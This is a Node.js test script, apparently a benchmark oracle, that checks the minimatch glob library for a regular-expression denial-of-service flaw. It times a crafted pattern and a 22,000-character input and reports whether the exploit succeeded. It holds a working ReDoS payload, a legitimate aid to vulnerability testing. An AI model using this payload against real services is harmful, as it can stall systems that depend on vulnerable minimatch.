let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function done() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const minimatch = require('minimatch');

  // Benign operation: verify public API works as expected.
  let benign1, benign2;
  try {
    benign1 = minimatch('file.js', '*.js');
    benign2 = minimatch('file.txt', '*.js');
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_call_threw:' + (e && e.message ? e.message : String(e));
    done();
    return;
  }

  if (benign1 !== true || benign2 !== false) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'benign_unexpected:benign1=' + String(benign1) + ';benign2=' + String(benign2);
    done();
    return;
  }

  operation_completed = true;

  // Known ReDoS trigger area in vulnerable minimatch.
  const pattern = '*(a|aa)';
  const controlInput = 'b';
  const maliciousInput = 'a'.repeat(22000) + '!';

  function measureMs(fn) {
    const t0 = process.hrtime.bigint();
    fn();
    const t1 = process.hrtime.bigint();
    return Number(t1 - t0) / 1e6;
  }

  // Warm up regex compilation/JIT paths.
  minimatch('warmup', pattern);

  let controlMs = 0;
  let controlResult;
  try {
    for (let i = 0; i < 6; i++) {
      controlMs += measureMs(function () {
        controlResult = minimatch(controlInput, pattern);
      });
    }
    controlMs /= 6;
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'control_failed:' + (e && e.message ? e.message : String(e));
    done();
    return;
  }

  let maliciousMs;
  let maliciousResult;
  try {
    maliciousMs = measureMs(function () {
      maliciousResult = minimatch(maliciousInput, pattern);
    });
  } catch (e) {
    // Malicious exception after benign success means blocked.
    exploit_succeeded = false;
    evidence = 'malicious_threw:' + (e && e.message ? e.message : String(e));
    done();
    return;
  }

  const ratio = maliciousMs / Math.max(controlMs, 0.0001);

  // Vulnerable versions should exhibit pronounced slowdown.
  exploit_succeeded = (maliciousMs > 120) && (ratio > 60);

  evidence =
    'pattern=' + pattern +
    ';control_len=' + controlInput.length +
    ';malicious_len=' + maliciousInput.length +
    ';control_ms=' + controlMs.toFixed(3) +
    ';malicious_ms=' + maliciousMs.toFixed(3) +
    ';ratio=' + ratio.toFixed(2) +
    ';control_result=' + String(controlResult) +
    ';malicious_result=' + String(maliciousResult);

  done();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_module_failure:' + (e && e.message ? e.message : String(e));
  done();
}